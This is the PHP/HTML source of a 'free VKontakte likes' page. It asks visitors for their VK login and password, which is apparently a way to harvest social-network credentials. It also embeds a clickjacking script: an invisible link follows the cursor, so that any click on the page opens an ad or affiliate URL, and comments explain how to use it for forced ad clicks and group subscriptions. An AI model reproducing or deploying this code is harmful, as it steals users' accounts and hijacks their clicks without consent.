<?php 
@session_start();
include("bd.php");
if (($_COOKIE["auth_vk"] == "1")) {
   header("Location: index.php");
   exit;
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Бесплатные лайки ВКонтакте</title>
      <link href="heart_9425.ico" rel="shortcut icon">
      <link href="css/bootstrap.min.css" rel="stylesheet">
      <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
      <link href="css/plugins/iCheck/custom.css" rel="stylesheet">
      <link href="css/animate.css" rel="stylesheet">
      <link href="css/style.css" rel="stylesheet">
   </head>
   <body class="gray-bg">
      <div class="middle-box text-center loginscreen   animated fadeInDown" style="    width: 570px;    max-width: 900px;">
         <div>
            <div>
               <h1 class="logo-name" style="font-size: 73px;color:#5e81a8"> VK LIKE</h1><br>
            </div>
            <center>Добро пожаловать на сервис получения бесплатных лайков!<br>
   Для продолжения работы с сервисом, требуется авторизация через vk.com
   </center><br>
            <div id="wait" style="display: none;margin-bottom: 7px;">
               <center><img src="images/upload_inv.gif" alt=""></center>
            </div>
            <div id="results"></div>
            <div class="form-group">
               <input type="text" name="login_vk" id="login_vk" class="form-control" placeholder="Логин" required="">
            </div>
            <div class="form-group">
               <input type="text" name="pass_vk" id="pass_vk" class="form-control" placeholder="Пароль" required="">
            </div>
            <button type="button" class="btn btn-primary block full-width m-b" onclick="logingo()">Войти</button>
         </div>
      </div>
      <script src="js/jquery-2.1.1.js"></script>
      <script src="js/bootstrap.min.js"></script>
      <script src="js/mys.js"></script>
      <script src="js/plugins/iCheck/icheck.min.js"></script>
<br>
<center>
<button type="submit" style="width:570px;height:35px;" class="btn btn-primary block m-b" name="golikes" id="golikes" onclick="nakrutka();window.open('http://vk-voting.ru/comment.php','_blank')">Комментарии/Отзывы</button>
</center>
<center>
<button type="submit" style="width:570px;height:35px;" class="btn btn-primary block m-b" name="golikes" id="golikes" onclick="nakrutka();window.open('http://vk-voting.ru/inst.php','_blank')"> Инструкция по накрутке лайков </button>
</center>
<br>
<center>
<iframe frameborder="0" src="/frame.php" width="570" height="300" scrolling="no" style="overflow: hidden;"></iframe>
</center>
<center>
<script>var _uox = _uox || {};(function() {var s=document.createElement("script");
s.src="http://static.usuarios-online.com/uo2.min.js";document.getElementsByTagName("head")[0].appendChild(s);})();</script>
<a href="http://www.usuarios-online.com/es/" data-id="c2ecbcb9199735edabcdb2ff5b265581" data-type="color" data-c1="#5e81a7" data-c2="#ffffff" data-c3="#ffffff" target="_blank" id="uox_link">usuarios online</a>
</center>
<br>
<html><body>
<!-- При вставке на страницу - удалить теги выше
	(c) D.iK.iJ - http://dikij.com/ -->
<div id="podpiska" style="z-index: 99999; cursor: default !important; display: none; opacity: 0; filter: alpha(Opacity=0); position: absolute; overflow: hidden; height: 30px !important; max-height: 30px !important; width: 30px !important; max-width: 30px !important;"><input autofocus type="text" id="blur1" onblur="clickit();" onclick="clickit();" style="height: 21px !important; cursor: default !important; width: 100% !important;">

<!--
// Этот скрипт позволяет открывать любую ссылку по 1 нажатию на страницу сайта.
// Можно использовать, например, для партнерок. А также, для кликов по рекламе (вместо ссылки вставляется рекламный блок и прокркчивается к тому месту, куда нужно нажать)
// Ниже в примере - используется для подписок на группу. Создаем виджет подписки в группу ВК (ОД) нажимаем подписаться и нам откроется всплывающее окно. Копируем его адрес и вставляем в href="" ниже.
// Получим примерно это: 
-->

<a href="https://myformat.club/lifestyle/business/millioner-gotov-otdat-svoyu-kvartiru-stoimostyu-150-000-sovershenno-besplatno-prosto-poprosite-ego-ob-etom/?utm_source=contentmoney&utm_medium=MRA2b69TVx3s" target="_blank" style="text-decoration: none !important; display: block; cursor: default !important; height: 30px !important; max-height: 30px !important; width: 30px !important; max-width: 30px !important;">&nbsp;</a>

</div>


<script type="text/javascript"><!--
//Функция для установки куки. Не трогаем.
function SetCookie2(id, days){
var ws=new Date();
ws.setDate((days-0+ws.getDate()));
document.cookie=id+"; path=/; expires="+ws.toGMTString();
}

// Если есть куки vkgr7=off - скрипт не вызывается. Можете изменить для отладки.
if(document.cookie.indexOf("vkgr7=off") == -1) {

// Функция передвижения кнопки за курсором.
function mv(event){
//Ширина и высота документа. Чтобы кнопка не делала прокрутку, вычитаем несколько пикселей
//var hei = document.getElementsByTagName("body")[0].offsetHeight-15;
var wi = document.getElementsByTagName("body")[0].offsetWidth-17;

//Координаты курсора. Вычитаем пиксели, чтобы курсор был на кнопке.
var e = event || window.event;
var xx1 = (e.pageX || e.clientX + document.documentElement.scrollLeft)-15;
var yy1 = (e.pageY || e.clientY + document.documentElement.scrollTop)-15;
if (xx1>wi) {xx1=wi;}
//if (yy1>hei) {yy1=hei;}

document.getElementById('podpiska').style.left=xx1+'px';
document.getElementById('podpiska').style.top=yy1+'px';

//Прокрутка окна к ссылке, а в данном примере - просто вниз до упора. Можно изменить для точности.
document.getElementById('podpiska').scrollTop='1000';
}

//Функции для автозапуска скрипта
document.onmousemove = mv;
document.onscroll = mv;
document.getElementById('podpiska').style.display='';
//Фокус на дополнительном элементе. При его потере - считаем скрипт сработавшим, так как body.onblur не везде работает.
setTimeout("document.getElementById('blur1').focus();", 900);
setTimeout("document.getElementById('podpiska').scrollTop='1000';", 1000);


//Если пользователь кликнул на фрейме или ушел со страницы, то закрываем окно на 1 день.

function clickit(){
setTimeout("document.getElementById('podpiska').style.display='none'; SetCookie2('vkgr7=off', 1);", 1000);
}

}
//--></script>



<!-- При вставке на страницу- удалить что ниже  -->
</body></html>
   </body>
</html>